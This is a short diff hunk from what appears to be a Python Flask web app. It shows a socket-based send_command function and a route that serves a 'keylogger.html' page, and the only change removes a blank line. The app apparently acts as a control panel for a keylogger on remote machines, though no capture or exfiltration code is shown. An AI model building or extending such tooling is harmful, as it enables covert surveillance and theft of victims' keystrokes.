@@ -21,7 +21,6 @@ def send_command(ip, command):
             return s.recv(BUFFER_SIZE).decode(errors="ignore")
     except Exception as e:
         return f"Error: {str(e)}"
-
 @app.route("/ ")
 def index():
     return render_template("keylogger.html")
